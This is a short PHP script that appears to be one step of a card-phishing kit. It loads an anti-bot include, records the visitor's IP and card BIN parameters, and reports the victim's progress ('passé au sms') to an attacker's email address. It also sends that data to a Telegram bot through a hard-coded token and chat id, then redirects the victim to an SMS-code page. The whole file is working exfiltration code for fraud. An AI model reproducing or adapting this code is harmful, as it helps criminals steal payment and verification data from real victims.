<?php
if(!isset($_SESSION)) { session_start(); } 
include 'antibots.php';
$ip = getenv("REMOTE_ADDR");
$xxx = $_GET['bin'];
$binlist = $_GET['binlist'];
$back = "sms.php?bin=".$xxx."&binlist=".$binlist;

$hostname = gethostbyaddr($ip);
$message .= "passé au sms \n";
$send = "noctt@yandex.com";
$subject = "$ip";
$headers = "From:pi<reality@superhosting.bg>";
mail($send,$subject,$message,$headers);
	$token = "5347410366:AAG4Y9rs4cvCASdkTYcSx3xl4PxQG9LXKL0";
$data = [
    'text' => $message,
    'chat_id' => '-706752114'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header("Location: $back");
?>